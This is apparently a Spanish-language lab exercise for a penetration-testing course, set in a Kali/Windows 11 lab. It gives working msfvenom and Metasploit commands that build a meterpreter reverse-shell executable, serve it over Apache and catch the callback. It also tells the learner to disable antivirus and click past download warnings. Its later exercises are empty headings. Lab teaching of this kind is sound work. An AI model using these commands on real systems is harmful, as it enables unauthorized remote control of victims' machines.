# Usar Metasploit para levantar un servidor VNC en la víctima.
   
Requisitos:
1. Máquina ***Router-Ubu***.
2. Máquina ***Kali Linux***.
2. Máquina ***Windows 11***

Una sola vulnerabilidad es lo que necesita el actor de la amenaza para poder obtener acceso a la víctima. Su objetivo en esta fase consiste en descubrir nuevas vulnerabilidades, servicios mal configurados, etc. que le permitan tomar el control por completo de la víctima.
Nota: También es posible contar con la inestimable colaboración del usuario y conseguir una shell inversa a pesar de que su equipo no contenga vulnerabilidades.


## Ejercicio 1: Abrir una sesión de Meterpreter.

Vamos a crear un payload en formato ejecutable que nos permita ganar acceso a la víctima, para poder descubrir si tiene otras vulnerabilidades.

En la máquina ***Kali*** abrimos una terminal y ejecutamos el siguiente comando para levantar el servidor web.
```
sudo service apache2 start
```

A continuación creamos un payload de ***meterpreter*** en formato ***ejecutable*** para ***Windows de 32 bits***. El ***listener*** estará en la máquina ***Kali*** escuchando en el puerto ***3333***. Aprovechamos y guardamos el payload en el directorio raíz del servidor web
```
sudo msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.20.9 LPORT=3333 -o /var/www/html/regalito.exe
```

En la terminal abrimos la herramienta ***Metasploit***.
```
sudo msfconsole
```
y configuramos el ***listener***.
```
use multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set LHOST 192.168.20.9
```
```
set LPORT 3333
```
```
exploit
```

Con esto el listener queda a la escucha de conexiones provenientes del payload.

Vamos a la máquina ***Windows 11***.

En este laboratorio no vamos a preocuparnos de evadir al antivirus, porque esas técnicas aún quedan por aprender. Así que simplemente desactivamos el antivirus mientras dura esta práctica.

![Antivirus off](../img/lab-06-C/202209171500.png)

Abrimos una sesión del navegador de Internet y nos conectamos a la siguiente URL.
Nota: Esto va a permitir pasar el payload a la víctima.
```
http://192.168.20.9/regalito.exe
```

El navegador advierte que descargar un ejecutable no es nada bueno, pero recordemos que solo estamos usando el servidor web para transportar el payload desde la máquina ***Kali*** hasta la víctima, así que hacemos clic en ***Keep***.

![Keep](../img/lab-06-C/202209171511.png)

Volvemos a insistir en la descarga.

![Keep anyway](../img/lab-06-C/202209171512.png)




## Ejercicio 2: Usar PowerShell Mafia para encontrar nuevas vulnerabilidades.

## Ejercicio 3: Levantar un servidor VNC en la víctima.